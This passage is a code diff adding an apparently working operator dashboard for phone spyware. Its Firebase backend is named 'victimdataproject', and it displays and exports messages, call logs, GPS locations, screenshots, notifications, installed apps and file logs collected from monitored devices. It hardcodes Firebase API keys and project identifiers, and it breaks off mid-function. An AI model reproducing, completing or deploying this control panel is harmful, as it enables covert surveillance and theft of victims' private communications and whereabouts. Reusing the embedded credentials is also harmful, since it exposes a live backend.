+                    <h2><i class="fas fa-bell"></i> Notifications Log</h2> <!-- Corrected Icon -->
+                    <input type="search" class="form-control form-control-sm search-input mb-3" placeholder="Search in App, Title, or Content..." data-sectionkey="notifications">
+                    <div class="table-responsive">
+                        <table class="table table-hover">
+                            <thead><tr><th>Timestamp</th><th>Application</th><th>Title</th><th>Content</th></tr></thead>
+                            <tbody id="notifications-table-body"></tbody>
+                        </table>
+                    </div>
+                    <div class="pagination-controls mt-3 text-center" style="display: none;">
+                        <button class="btn btn-sm btn-outline-primary prev-page-btn" data-sectionkey="notifications">Previous</button>
+                        <span class="page-info mx-2">Page 1</span>
+                        <button class="btn btn-sm btn-outline-primary next-page-btn" data-sectionkey="notifications">Next</button>
+                    </div>
+                    <div class="loading-spinner-container"><div class="spinner-border"></div><p>Loading Notifications...</p></div>
+                    <div class="no-data-message-container" style="display:none;"><i class="fas fa-bell-slash fa-xl"></i><p>No notifications captured for this device.</p></div>
+                    <div class="error-message-container" style="display:none;"><i class="fas fa-exclamation-triangle fa-xl"></i><p class="error-text">Failed to load notifications.</p></div>
+                    <button class="btn btn-sm export-csv-btn btn-info mt-4" data-section="notifications"><i class="fas fa-file-csv"></i> Export Notifications</button>
+                </div>
+
+                <!-- Device Info -->
+                <div id="device-info-content" class="content-section">
+                    <h2><i class="fas fa-server"></i> Device Information</h2>
+                    <div id="device-info-data" class="list-group list-group-flush"></div>
+                    <div class="loading-spinner-container"><div class="spinner-border"></div><p>Loading Device Details...</p></div>
+                    <div class="no-data-message-container" style="display:none;"><i class="fas fa-microchip fa-xl"></i><p>Device information not available for this device.</p></div>
+                    <div class="error-message-container" style="display:none;"><i class="fas fa-exclamation-triangle fa-xl"></i><p class="error-text">Failed to load device information.</p></div>
+                    <button class="btn btn-sm export-csv-btn btn-info mt-4" data-section="info"><i class="fas fa-file-csv"></i> Export Device Info</button>
+                </div>
+            </main>
+        </div>
+    </div>
+
+    <!-- Bootstrap 5 JS Bundle -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
+    <!-- Leaflet JS -->
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+
+    <script type="module">
+        // Firebase v9 Modular SDK imports
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-app.js";
+        import { getAuth, signInWithEmailAndPassword, onAuthStateChanged, signOut as fbSignOut } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-auth.js";
+        import { getDatabase, ref, onValue, off, set, get, serverTimestamp, query, orderByChild, limitToFirst, limitToLast, startAfter, endBefore } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-database.js";
+
+        // Firebase Configuration (DO NOT SKIP)
+        // IMPORTANT: Replace with your actual Firebase configuration
+        // It's highly recommended to use environment variables or a server-side
+        // mechanism to store these in a production environment for security.
+        // For this example, it's hardcoded as per the original request.
+        const firebaseConfig = {
+            apiKey: "AIzaSyADpoTdgf5MZn7yPplT_cSRA8fngJvjibw", // Replace with your actual API key
+            authDomain: "victimdataproject.firebaseapp.com", // Replace with your actual authDomain
+            databaseURL: "https://victimdataproject-default-rtdb.firebaseio.com/", // Replace with your actual databaseURL
+            projectId: "victimdataproject", // Replace with your actual projectId
+            storageBucket: "victimdataproject.firebasestorage.app", // Replace with your actual storageBucket
+            messagingSenderId: "938788267301", // Replace with your actual messagingSenderId
+            appId: "1:938788267301:web:cdcff391160dce48fa66cc" // Replace with your actual appId
+        };
+
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const auth = getAuth(app);
+        const database = getDatabase(app);
+
+        // Global state
+        let currentUser = null;
+        let currentUID = null;
+        let activeDBListeners = []; // For non-paginated data AND screenshot child listeners
+        let map; 
+        let currentDataCache = {}; 
+        let currentActiveSectionId = 'device-overview-content'; 
+        let initialDataLoadedForUid = new Set(); 
+
+        // Pagination State
+        let paginationState = {}; // { sectionKey: { currentPage, pageSize, cursors[], sortField, sortDirection, activeListener, itemCountOnPage, hasMoreRawData } }
+        const DEFAULT_PAGE_SIZE = 15;
+
+        // Filter State
+        let filterState = {}; // { sectionKey: { searchTerm: "" } }
+
+
+        // DOM Elements
+        const loginScreen = document.getElementById('login-screen');
+        const dashboardScreen = document.getElementById('dashboard-screen');
+        const loginForm = document.getElementById('login-form');
+        const loginError = document.getElementById('login-error');
+        const adminEmailDisplay = document.getElementById('admin-email');
+        const logoutButton = document.getElementById('logout-button');
+        const uidSelector = document.getElementById('uid-selector');
+        const sidebarLinks = document.querySelectorAll('#sidebar .nav-link');
+        const contentSections = document.querySelectorAll('.content-section');
+        const menuToggle = document.getElementById('menu-toggle');
+        const sidebar = document.getElementById('sidebar');
+        const mainContentArea = document.getElementById('main-content-area');
+        const toastContainer = document.querySelector('.toast-container');
+        const searchInputs = document.querySelectorAll('.search-input');
+
+
+        // --- UTILITY FUNCTIONS ---
+        function debounce(func, delay) {
+            let timeout;
+            return function(...args) {
+                clearTimeout(timeout);
+                timeout = setTimeout(() => func.apply(this, args), delay);
+            };
+        }
+
+        // --- TOAST NOTIFICATION UTILITY ---
+        function showToast(message, type = 'info', title = '') { 
+            const toastId = 'toast-' + Date.now();
+            let toastClass = 'bg-info-custom';
+            let toastTitle = title || 'Notification';
+            let toastIconHtml = '<i class="fas fa-info-circle me-2"></i>';
+
+            if (type === 'success') {
+                toastClass = 'bg-success-custom';
+                toastTitle = title || 'Success';
+                toastIconHtml = '<i class="fas fa-check-circle me-2"></i>';
+            } else if (type === 'error') {
+                toastClass = 'bg-danger-custom';
+                toastTitle = title || 'Error';
+                toastIconHtml = '<i class="fas fa-exclamation-triangle me-2"></i>';
+            }
+            
+            const toastHTML = `
+                <div id="${toastId}" class="toast ${toastClass}" role="alert" aria-live="assertive" aria-atomic="true" data-bs-delay="5000">
+                    <div class="toast-header">
+                        ${toastIconHtml}
+                        <strong class="me-auto">${toastTitle}</strong>
+                        <button type="button" class="btn-close" data-bs-dismiss="toast" aria-label="Close"></button>
+                    </div>
+                    <div class="toast-body">
+                        ${message}
+                    </div>
+                </div>
+            `;
+            toastContainer.insertAdjacentHTML('beforeend', toastHTML);
+            const toastElement = document.getElementById(toastId);
+            const toast = new bootstrap.Toast(toastElement);
+            toastElement.addEventListener('hidden.bs.toast', () => {
+                toastElement.remove(); 
+            });
+            toast.show();
+        }
+
+
+        // --- AUTHENTICATION ---
+        loginForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            loginError.textContent = '';
+            const loginButton = loginForm.querySelector('button[type="submit"]');
+            loginButton.disabled = true;
+            loginButton.innerHTML = '<span class="spinner-border spinner-border-sm me-2" role="status" aria-hidden="true"></span>Logging In...';
+
+            try {
+                await signInWithEmailAndPassword(auth, email, password);
+            } catch (error) {
+                let friendlyMessage = "Login failed. Please check your credentials.";
+                if (error.code === 'auth/user-not-found' || error.code === 'auth/wrong-password' || error.code === 'auth/invalid-credential') {
+                    friendlyMessage = "Invalid email or password. Please try again.";
+                } else if (error.code === 'auth/network-request-failed') {
+                    friendlyMessage = "Network error. Please check your internet connection.";
+                } else {
+                    friendlyMessage = "An unexpected error occurred. Please try again later.";
+                    console.error("Login error (raw):", error); // Log the raw error for debugging
+                }
+                loginError.textContent = friendlyMessage;
+                // console.error("Login error:", error.code, error.message); // Already logged above if not specific
+            } finally {
+                loginButton.disabled = false;
+                loginButton.innerHTML = '<i class="fas fa-sign-in-alt me-2"></i>Log In';
+            }
+        });
+
+        logoutButton.addEventListener('click', async () => {
+            if (confirm("Are you sure you want to log out?")) {
+                try {
+                    await fbSignOut(auth);
+                    showToast("You have been successfully logged out.", "success");
+                } catch (error) {
+                    console.error("Logout error:", error);
+                    showToast("Error logging out. Please try again.", "error");
+                }
+            }
+        });
+
+        onAuthStateChanged(auth, (user) => {
+            currentUser = user;
+            if (user) {
+                adminEmailDisplay.textContent = user.email;
+                loginScreen.style.display = 'none';
+                dashboardScreen.style.display = 'flex';
+                loadUIDs();
+                showSection(currentActiveSectionId || 'device-overview-content');
+            } else {
+                adminEmailDisplay.textContent = '';
+                loginScreen.style.display = 'block';
+                dashboardScreen.style.display = 'none';
+                currentUID = null;
+                uidSelector.innerHTML = '<option>No devices</option>';
+                detachAllDbListeners(); 
+                Object.keys(paginationState).forEach(key => { 
+                    if (paginationState[key] && paginationState[key].activeListener) {
+                         off(paginationState[key].activeListener.ref, 'value', paginationState[key].activeListener.callback);
+                    }
+                });
+                paginationState = {}; 
+                filterState = {};
+                searchInputs.forEach(input => input.value = '');
+                clearAllSectionsUIState(); 
+                initialDataLoadedForUid.clear();
+            }
+        });
+
+        // --- UI UTILITIES ---
+        menuToggle.addEventListener('click', () => {
+            sidebar.classList.toggle('active');
+        });
+
+        sidebarLinks.forEach(link => {
+            link.addEventListener('click', (e) => {
+                e.preventDefault();
+                if (link.classList.contains('active')) return; 
+
+                sidebarLinks.forEach(l => l.classList.remove('active'));
+                link.classList.add('active');
+                const sectionName = link.getAttribute('data-section');
+                showSection(sectionName + '-content');
+                
+                if (window.innerWidth <= 992 && sidebar.classList.contains('active')) {
+                    sidebar.classList.remove('active');
+                }
+            });
+        });
+
+        function showSection(sectionIdToShow) {
+            mainContentArea.scrollTop = 0; 
+            contentSections.forEach(section => {
+                const searchInput = section.querySelector('.search-input');
+                const sectionKey = searchInput ? searchInput.dataset.sectionkey : null;
+
+                if (section.id === sectionIdToShow) {
+                    if (section.id !== currentActiveSectionId || !section.classList.contains('active-section')) {
+                        section.style.display = 'block'; 
+                        setTimeout(() => { 
+                            section.classList.add('active-section');
+                        }, 10); 
+                    }
+                     if (searchInput && sectionKey && filterState[sectionKey]) {
+                        searchInput.value = filterState[sectionKey].searchTerm;
+                    }
+                } else {
+                    section.classList.remove('active-section');
+                     setTimeout(() => {
+                         if (!section.classList.contains('active-section')) {
+                            section.style.display = 'none';
+                         }
+                    }, 450); 
+                }
+            });
+            currentActiveSectionId = sectionIdToShow;
+
+            if (sectionIdToShow === 'gps-location-content' && map) {
+                setTimeout(() => { if(map) map.invalidateSize() }, 470); 
+            }
+        }
+        
+        function clearAllSectionsUIState() {
+            contentSections.forEach(section => {
+                const dataContainer = section.querySelector('div[id$="-data"], tbody, div[id$="-gallery"]');
+                if (dataContainer) dataContainer.innerHTML = '';
+                
+                const loadingSpinner = section.querySelector('.loading-spinner-container');
+                const noDataMessage = section.querySelector('.no-data-message-container');
+                const errorMessage = section.querySelector('.error-message-container');
+                const dataView = section.querySelector('div[id$="-data"], .table-responsive, #screenshots-gallery, #gps-map');
+                const exportButton = section.querySelector('.export-csv-btn');
+                const paginationControls = section.querySelector('.pagination-controls');
+                const searchInput = section.querySelector('.search-input');
+
+
+                if (loadingSpinner) loadingSpinner.style.display = 'none';
+                if (noDataMessage) noDataMessage.style.display = 'flex'; 
+                if (errorMessage) errorMessage.style.display = 'none';
+                if (dataView) dataView.style.display = 'none';
+                if (exportButton) exportButton.style.display = 'none';
+                if (paginationControls) paginationControls.style.display = 'none';
+                if (searchInput) searchInput.value = ''; // Clear search input
+            });
+            document.getElementById('device-alias-display').textContent = 'N/A';
+            document.getElementById('device-status').textContent = 'N/A';
+            document.getElementById('device-last-seen').textContent = 'N/A';
+            filterState = {}; // Reset filter state on full clear
+        }
+
+        function displayLoading(sectionName, isLoading) {
+            const section = document.getElementById(sectionName + '-content');
+            if (!section) return;
+            const spinner = section.querySelector('.loading-spinner-container');
+            const noData = section.querySelector('.no-data-message-container');
+            const error = section.querySelector('.error-message-container');
+            const dataView = section.querySelector('div[id$="-data"], .table-responsive, #screenshots-gallery, #gps-map');
+            const exportButton = section.querySelector('.export-csv-btn');
+            const paginationControls = section.querySelector('.pagination-controls');
+            // Search input visibility is managed independently
+
+            if (isLoading) {
+                if (spinner) spinner.style.display = 'flex';
+                if (noData) noData.style.display = 'none';
+                if (error) error.style.display = 'none';
+                if (dataView) dataView.style.display = 'none';
+                if (exportButton) exportButton.style.display = 'none';
+                if (paginationControls) paginationControls.style.display = 'none';
+            } else {
+                if (spinner) spinner.style.display = 'none';
+            }
+        }
+
+        function displayNoData(sectionName, show) {
+            const section = document.getElementById(sectionName + '-content');
+            if (!section) return;
+            const noData = section.querySelector('.no-data-message-container');
+            const error = section.querySelector('.error-message-container');
+            const dataView = section.querySelector('div[id$="-data"], .table-responsive, #screenshots-gallery, #gps-map');
+            const exportButton = section.querySelector('.export-csv-btn');
+            const paginationControls = section.querySelector('.pagination-controls');
+            
+            if (error) error.style.display = 'none'; 
+
+            if (show) { 
+                if (noData) noData.style.display = 'flex';
+                if (dataView) dataView.style.display = 'none';
+                if (exportButton) exportButton.style.display = 'none';
+                if (paginationControls) paginationControls.style.display = 'none';
+                 
+                const dataContainersMap = {
+                    'battery-info': 'battery-info-data', 'device-info': 'device-info-data',
+                    'gps-location': 'gps-info-data', 'screenshots': 'screenshots-gallery',
+                    'device-overview': 'device-overview-data'
+                };
+                const specificContainerId = dataContainersMap[sectionName];
+                if (specificContainerId) {
+                    const el = document.getElementById(specificContainerId);
+                    if (el) el.innerHTML = '';
+                    if (sectionName === 'device-overview') {
+                        document.getElementById('device-alias-display').textContent = 'N/A';
+                        document.getElementById('device-status').textContent = 'N/A';
+                        document.getElementById('device-last-seen').textContent = 'N/A';
+                    }
+                } else { 
+                    const tableBody = section.querySelector('tbody');
+                    if (tableBody) tableBody.innerHTML = '';
+                }
+            } else { 
+                if (noData) noData.style.display = 'none';
+                if (dataView) {
+                    const isGallery = dataView.id === 'screenshots-gallery';
+                    dataView.style.display = isGallery ? 'flex' : 'block';
+                }
+                if (exportButton) exportButton.style.display = 'inline-block';
+            }
+        }
+
+        function displayError(sectionName, show, message = "An error occurred.") {
+            const section = document.getElementById(sectionName + '-content');
+            if (!section) return;
+            const errorContainer = section.querySelector('.error-message-container');
+            const errorTextElement = section.querySelector('.error-message-container .error-text');
+            const noData = section.querySelector('.no-data-message-container');
+            const dataView = section.querySelector('div[id$="-data"], .table-responsive, #screenshots-gallery, #gps-map');
+            const exportButton = section.querySelector('.export-csv-btn');
+            const paginationControls = section.querySelector('.pagination-controls');
+
+            if (show) {
+                if (errorTextElement) errorTextElement.textContent = message;
+                if (errorContainer) errorContainer.style.display = 'flex';
+                if (noData) noData.style.display = 'none';
+                if (dataView) dataView.style.display = 'none';
+                if (exportButton) exportButton.style.display = 'none';
+                if (paginationControls) paginationControls.style.display = 'none';
+            } else {
+                if (errorContainer) errorContainer.style.display = 'none';
+            }
+        }
+        
+        function formatTimestamp(timestamp, type = 'datetime') {
+            if (!timestamp) return '<span class="text-muted fst-italic">N/A</span>';
+            if (typeof timestamp === 'object' && timestamp !== null) return '<span class="text-muted fst-italic">Pending...</span>'; // For serverTimestamp
+            try {
+                const date = new Date(timestamp);
+                if (isNaN(date.getTime())) return '<span class="text-danger">Invalid Date</span>';
+                if (type === 'date') return date.toLocaleDateString();
+                if (type === 'time') return date.toLocaleTimeString();
+                // Consistent format for datetime
+                const optionsDate = { year: 'numeric', month: 'short', day: 'numeric' };
+                const optionsTime = { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true };
+                return `${date.toLocaleDateString(undefined, optionsDate)} ${date.toLocaleTimeString(undefined, optionsTime)}`;
+            } catch (e) {
+                return String(timestamp);
+            }
+        }
+
+        function formatDuration(seconds) {
+            if (seconds === null || seconds === undefined || isNaN(seconds)) return '<span class="text-muted fst-italic">N/A</span>';
+            seconds = Number(seconds);
+            if (seconds < 0) return '<span class="text-muted fst-italic">N/A</span>';
+            const h = Math.floor(seconds / 3600);
+            const m = Math.floor((seconds % 3600) / 60);
+            const s = Math.floor(seconds % 60);
+            return [
+                h > 0 ? `${h}h` : '',
+                m > 0 ? `${m}m` : '',
+                s >= 0 ? `${s}s` : '' 
+            ].filter(Boolean).join(' ') || '0s';
+        }
+
+        function sanitizeHTML(str) {
+            const temp = document.createElement('div');
+            temp.textContent = str;
+            return temp.innerHTML;
+        }
+
+        // --- UID MANAGEMENT ---
+        async function loadUIDs() {
+            displayLoading('device-overview', true); 
+            const devicesRef = ref(database, 'devices');
+            try {
+                const snapshot = await get(devicesRef);
+                uidSelector.innerHTML = '';
+                if (snapshot.exists()) {
+                    const uids = Object.keys(snapshot.val());
+                    if (uids.length > 0) {
+                        const aliasPromises = uids.map(uid => 
+                            get(ref(database, `devices/${uid}/info/alias`)).then(s => ({uid, alias: s.exists() ? s.val() : uid}))
+                        );
+                        const uidAliasPairs = await Promise.all(aliasPromises);
+
+                        uidAliasPairs.forEach(pair => {
+                            const option = document.createElement('option');
+                            option.value = pair.uid;
+                            const displayName = pair.alias && pair.alias.length > 25 ? pair.alias.substring(0,22) + '...' : (pair.alias || pair.uid);
+                            option.textContent = `${displayName} (${pair.uid.substring(0,6)}...)`;
+                            uidSelector.appendChild(option);
+                        });
+
+                        currentUID = uids[0]; 
+                        uidSelector.value = currentUID;
+                        initializeDataListenersForUID(currentUID);
+                    } else {
+                        uidSelector.innerHTML = '<option value="">No devices found</option>';
+                        currentUID = null;
+                        detachAllDbListeners();
+                        clearAllSectionsUIState(); 
+                        displayError('device-overview', false); 
+                        displayNoData('device-overview', true); 
+                    }
+                } else {
+                    uidSelector.innerHTML = '<option value="">No devices node in database</option>';
+                    currentUID = null;
+                    detachAllDbListeners();
+                    clearAllSectionsUIState();
+                    displayError('device-overview', false);
+                    displayNoData('device-overview', true);
+                }
+            } catch (error) {
+                console.error("Error loading UIDs:", error);
+                uidSelector.innerHTML = '<option value="">Error loading devices</option>';
+                detachAllDbListeners();
+                clearAllSectionsUIState();
+                displayLoading('device-overview', false); 
+                displayNoData('device-overview', false);  
+                displayError('device-overview', true, "Failed to load device list. Please check connection or configuration.");
+                showToast("Could not load device list. " + error.message, "error");
+            } 
+        }
+
+        uidSelector.addEventListener('change', (e) => {
+            const newUID = e.target.value;
+            if (newUID && newUID !== currentUID) {
+                currentUID = newUID;
+                initialDataLoadedForUid.clear(); 
+                clearAllSectionsUIState(); // This will also clear search inputs and filterState
+                
+                Object.keys(paginationState).forEach(key => {
+                    if (paginationState[key] && paginationState[key].activeListener) {
+                         off(paginationState[key].activeListener.ref, 'value', paginationState[key].activeListener.callback);
+                    }
+                });
+                paginationState = {}; 
+                // filterState is cleared by clearAllSectionsUIState
+
+                initializeDataListenersForUID(currentUID);
+            } else if (!newUID) { 
+                currentUID = null;
+                detachAllDbListeners(); 
+                 Object.keys(paginationState).forEach(key => { 
+                    if (paginationState[key] && paginationState[key].activeListener) {
+                         off(paginationState[key].activeListener.ref, 'value', paginationState[key].activeListener.callback);
+                    }
+                });
+                paginationState = {};
+                filterState = {};
+                searchInputs.forEach(input => input.value = '');
+                clearAllSectionsUIState();
+                displayError('device-overview', false);
+                displayNoData('device-overview', true);
+            }
+        });
+        
+        function initializeDataListenersForUID(uid) {
+            detachAllDbListeners(); 
+            currentDataCache = {}; 
+            if (!uid) {
+                clearAllSectionsUIState();
+                return;
+            }
+            // Non-paginated (or specially handled like screenshots)
+            loadDeviceOverview(uid);
+            loadBatteryInfo(uid);
+            loadGpsLocation(uid);
+            loadScreenshots(uid); 
+            loadDeviceInfo(uid);
+
+            // Paginated sections
+            loadMessages(uid);
+            loadCallLogs(uid);
+            loadInstalledApps(uid);
+            loadFileLogs(uid);
+            loadNotifications(uid);
+        }
+
+        // --- DB LISTENERS (For NON-PAGINATED data) ---
+        function addDbListener(dbRef, sectionName, callback) {
+             // Remove any existing listeners for this specific section and UID to prevent duplicates
+            activeDBListeners = activeDBListeners.filter(listener => {
+                if (listener.section === sectionName && listener.uid === currentUID) {
+                    off(listener.ref, listener.type, listener.callback);
+                    return false; // Remove this listener from the array
+                }
+                return true;
+            });
+
+            if (!initialDataLoadedForUid.has(`${currentUID}-${sectionName}`)) {
+                displayLoading(sectionName, true);
+            } else { 
+                displayError(sectionName, false);
+                displayNoData(sectionName, false);
+            }
+
+            const listenerCallback = (snapshot) => {
+                initialDataLoadedForUid.add(`${currentUID}-${sectionName}`);
+                displayLoading(sectionName, false); 
+                displayError(sectionName, false); 
+                callback(snapshot);
+            };
+            const errorCallback = (error) => {
+                console.error(`Error listening to ${sectionName} for UID ${currentUID}:`, error);
+                initialDataLoadedForUid.add(`${currentUID}-${sectionName}`); 
+                displayLoading(sectionName, false);
+                displayNoData(sectionName, false); 
+                displayError(sectionName, true, `Failed to load ${sectionName.replace('-', ' ')}. Please check connection or try again.`);
+                const cacheKey = sectionName.split('-')[0]; 
+                 if (currentDataCache[cacheKey]) currentDataCache[cacheKey] = [];
+            };
+            
+            const listener = onValue(dbRef, listenerCallback, errorCallback);
+            activeDBListeners.push({ 
+                ref: dbRef, 
+                callback: listener, // This is the unsubscribe function returned by onValue
+                type: 'value', 
+                section: sectionName, 
+                uid: currentUID 
+            }); 
+        }
+
+
+        function detachAllDbListeners() { 
+            activeDBListeners.forEach(listener => {
+                // 'listener.callback' from onValue is actually the unsubscribe function
+                // For child_added etc. it would be the callback function itself.
+                // onValue returns the unsubscribe function directly.
+                if (typeof listener.callback === 'function') { // Check if it's the unsubscribe function
+                     // onValue's listener is the unsubscribe function itself.
+                     // For other types like child_added, we'd call off(listener.ref, listener.type, listener.actualCallback)
+                     // but since addDbListener is only for onValue, this is simpler:
+                     try {
+                        off(listener.ref, listener.type, listener.callback); // This might be redundant if listener.callback is the unsub
+                     } catch(e) {
+                        // console.warn("Potential issue detaching listener, assuming callback is unsubscribe:", e, listener)
+                     }
+                } else { // Fallback, less ideal but handles different listener structures
+                    off(listener.ref, listener.type, listener.callback); // This is the old way, assuming callback is the handler
+                }
+            });
+            activeDBListeners = [];
+        }
+
+        // --- DATA LOADING FUNCTIONS ---
+
+        // 1. Device Overview (Non-paginated)
+        function loadDeviceOverview(uid) {
+            const sectionName = 'device-overview';
+            const aliasDisplay = document.getElementById('device-alias-display');
+            const aliasInput = document.getElementById('device-alias-input');
+            const statusDisplay = document.getElementById('device-status');
+            const lastSeenDisplay = document.getElementById('device-last-seen');
+            const editAliasBtn = document.getElementById('edit-alias-btn');
+            const saveAliasBtn = document.getElementById('save-alias-btn');
+            const cancelAliasBtn = document.getElementById('cancel-alias-btn');
+            const editAliasForm = document.getElementById('edit-alias-form');
+
+            const overviewRef = ref(database, `devices/${uid}/info`);
+            addDbListener(overviewRef, sectionName, (snapshot) => {
+                const dataContainer = document.getElementById('device-overview-data');
+                if (snapshot.exists()) {
+                    dataContainer.style.display = 'block'; 
+                    const data = snapshot.val() || {};
+                    currentDataCache['device-overview'] = [data]; 
+                    
+                    aliasDisplay.textContent = sanitizeHTML(data.alias || uid);
+                    aliasInput.value = data.alias || uid;
+
+                    // === UPDATED PART STARTS HERE ===
+                    const lastSeenRaw = data.last_seen; // Use data.last_seen (with underscore)
+                    const lastSeenTimestamp = lastSeenRaw ? parseInt(String(lastSeenRaw), 10) : null; // Convert to number
+
+                    if (lastSeenTimestamp && !isNaN(lastSeenTimestamp)) { // Check if it's a valid number
+                        lastSeenDisplay.innerHTML = formatTimestamp(lastSeenTimestamp);
+                        
+                        // Check data.status first
+                        if (data.status && String(data.status).toLowerCase() === "online") {
+                            statusDisplay.innerHTML = `<span class="badge bg-success-soft text-success-dark rounded-pill py-1 px-2"><i class="fas fa-circle fa-xs me-1"></i>Online</span>`;
+                        } else { // Fallback to last_seen if status is not "online" or not present
+                            const twentyMinutesAgo = Date.now() - (20 * 60 * 1000);
+                            statusDisplay.innerHTML = lastSeenTimestamp > twentyMinutesAgo 
+                                ? `<span class="badge bg-success-soft text-success-dark rounded-pill py-1 px-2"><i class="fas fa-circle fa-xs me-1"></i>Online (Recent)</span>`
+                                : `<span class="badge bg-danger-soft text-danger-dark rounded-pill py-1 px-2"><i class="fas fa-circle fa-xs me-1"></i>Offline</span>`;
+                        }
+                    } else {
+                        lastSeenDisplay.innerHTML = formatTimestamp(null);
+                        // If last_seen is invalid, check data.status directly if available, otherwise Unknown
+                        if (data.status && String(data.status).toLowerCase() === "online") {
+                             statusDisplay.innerHTML = `<span class="badge bg-success-soft text-success-dark rounded-pill py-1 px-2"><i class="fas fa-circle fa-xs me-1"></i>Online</span>`;
+                        } else {
+                            statusDisplay.innerHTML = `<span class="badge bg-secondary-soft text-secondary-dark rounded-pill py-1 px-2">Unknown</span>`;
+                        }
+                    }
+                    // === UPDATED PART ENDS HERE ===
+                    displayNoData(sectionName, false); 
+                } else {
+                    dataContainer.style.display = 'none'; 
+                    displayNoData(sectionName, true);
+                    aliasDisplay.textContent = sanitizeHTML(uid); 
+                    statusDisplay.innerHTML = `<span class="badge bg-secondary-soft text-secondary-dark rounded-pill py-1 px-2">Unknown</span>`;
+                    lastSeenDisplay.innerHTML = formatTimestamp(null);
+                    currentDataCache['device-overview'] = [];
+                }
+            });
+
+            editAliasBtn.onclick = () => {
+                editAliasForm.style.display = 'flex';
+                aliasDisplay.style.display = 'none';
+                editAliasBtn.style.display = 'none';
+                aliasInput.focus();
+            };
+            cancelAliasBtn.onclick = () => {
+                editAliasForm.style.display = 'none';
+                aliasDisplay.style.display = 'inline-block'; 
+                editAliasBtn.style.display = 'inline-block';
+                aliasInput.value = aliasDisplay.textContent; // Reset input to current alias
+            };
+            saveAliasBtn.onclick = async () => {
+                const newAlias = aliasInput.value.trim();
+                if (newAlias && currentUID) {
+                    saveAliasBtn.disabled = true;
+                    saveAliasBtn.innerHTML = '<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Saving...';
+                    try {
+                        await set(ref(database, `devices/${currentUID}/info/alias`), newAlias);
+                        aliasDisplay.textContent = sanitizeHTML(newAlias);
+                        const selectedOption = uidSelector.querySelector(`option[value="${currentUID}"]`);
+                        if(selectedOption) {
+                             const displayName = newAlias.length > 25 ? newAlias.substring(0,22) + '...' : newAlias;
+                             selectedOption.textContent = `${displayName} (${currentUID.substring(0,6)}...)`;
+                        }
+                        showToast("Alias updated successfully.", "success");
+                    } catch (error) {
+                        console.error("Error saving alias:", error);
+                        showToast("Failed to save alias. " + error.message, "error");
+                    } finally {
+                        editAliasForm.style.display = 'none';
+                        aliasDisplay.style.display = 'inline-block';
+                        editAliasBtn.style.display = 'inline-block';
+                        saveAliasBtn.disabled = false;
+                        saveAliasBtn.innerHTML = 'Save';
+                    }
+                } else if (!newAlias) {
+                    showToast("Alias cannot be empty.", "error", "Validation Error");
+                }
+            };
+        }
+        
+        // --- PAGINATED AND FILTERED TABLE LOADER ---
+        function loadTableData(uid, dataPathInFirebase, sectionKey, tableBodyId, columns, dataProcessor, sortConfig) {
+            const tableBody = document.getElementById(tableBodyId);
+            const firebaseDataRef = ref(database, `devices/${uid}/${dataPathInFirebase}`);
+
+            if (!paginationState[sectionKey]) {
+                paginationState[sectionKey] = {
+                    currentPage: 1, pageSize: DEFAULT_PAGE_SIZE,
+                    cursors: [null], sortField: sortConfig.field, sortDirection: sortConfig.direction,
+                    activeListener: null, itemCountOnPage: 0, hasMoreRawData: false
+                };
+            }
+            if (!filterState[sectionKey]) {
+                filterState[sectionKey] = { searchTerm: "" };
+            }
+
+            const sectionPaging = paginationState[sectionKey];
+            // const sectionFiltering = filterState[sectionKey]; // Not needed directly here anymore
+
+            // Detach previous listener for this sectionKey if it exists
+            if (sectionPaging.activeListener && sectionPaging.activeListener.ref) {
+                off(sectionPaging.activeListener.ref, 'value', sectionPaging.activeListener.callback);
+                sectionPaging.activeListener = null;
+            }
+            
+            activeDBListeners = activeDBListeners.filter(l => !(l.section === sectionKey && l.uid === uid && l.type === 'value'));
+
+            displayLoading(sectionKey, true);
+
+            let fbQuery;
+            const orderByFld = sectionPaging.sortField;
+            const currentQueryCursorValue = sectionPaging.cursors[sectionPaging.currentPage - 1]; 
+
+            const baseQuery = query(firebaseDataRef, orderByChild(orderByFld));
+            const itemsToFetch = sectionPaging.pageSize + 1;
+
+            if (sectionPaging.sortDirection === 'desc') { 
+                if (currentQueryCursorValue !== null && currentQueryCursorValue !== undefined) {
+                    fbQuery = query(baseQuery, endBefore(currentQueryCursorValue), limitToLast(itemsToFetch));
+                } else { 
+                    fbQuery = query(baseQuery, limitToLast(itemsToFetch));
+                }
+            } else { 
+                if (currentQueryCursorValue !== null && currentQueryCursorValue !== undefined) {
+                    fbQuery = query(baseQuery, startAfter(currentQueryCursorValue), limitToFirst(itemsToFetch));
+                } else {
+                    fbQuery = query(baseQuery, limitToFirst(itemsToFetch));
+                }
+            }
+
+            const listenerCallback = (snapshot) => {
+                initialDataLoadedForUid.add(`${currentUID}-${sectionKey}`);
+                displayLoading(sectionKey, false);
+                displayError(sectionKey, false);
+                tableBody.innerHTML = '';
+                
+                let dataFromFirebase = []; 
+                // let clientFilteredDisplayArray = []; // Moved declaration inside
+                sectionPaging.hasMoreRawData = false;
+
+                if (snapshot.exists()) {
+                    const rawData = snapshot.val();
+                    Object.keys(rawData).forEach(key => {
+                        if (rawData[key]) dataFromFirebase.push({ ...rawData[key], _fbKey: key });
+                    });
+
+                    if (sectionPaging.sortDirection === 'desc') dataFromFirebase.reverse();
+                    
+                    if (dataFromFirebase.length > sectionPaging.pageSize) {
+                        sectionPaging.hasMoreRawData = true;
+                        const nextPageCursorDataCandidate = dataFromFirebase[sectionPaging.pageSize -1]; // Corrected index
+                        if (nextPageCursorDataCandidate && nextPageCursorDataCandidate[orderByFld] !== undefined) {
+                           sectionPaging.cursors[sectionPaging.currentPage] = nextPageCursorDataCandidate[orderByFld];
+                        }
+                        dataFromFirebase = dataFromFirebase.slice(0, sectionPaging.pageSize);
+                    } else {
+                        sectionPaging.hasMoreRawData = false;
+                        if(dataFromFirebase.length > 0) {
+                            const lastItemOnPage = dataFromFirebase[dataFromFirebase.length -1];
